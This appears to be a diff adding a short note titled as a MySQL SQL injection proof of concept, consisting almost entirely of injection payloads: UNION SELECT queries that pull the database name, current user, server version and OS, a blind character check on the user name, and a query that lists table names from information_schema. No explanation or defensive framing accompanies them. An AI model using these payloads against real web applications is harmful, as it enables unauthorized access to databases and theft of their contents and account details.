@@ -1,0 +1,13 @@
+/* csf_2015_5_8 SQLinject mysql poc */
+date=csf_2015_5_10
+name=SQLinject mysql poc123
+
+POC:
+
+union select 1,2,database(),user(),5,6,version(),8,9
+
+union select 1,2,@@global.version_compile_os,4,5,6,7,8,9 from mysql.user
+
+and ord(mid(user(),1,1))=114
+
+union select 1,2,3,group_concat(table_name),5,6,7,8,9 from information_schema.TABLES where TABLE_SCHEMA=0x647963
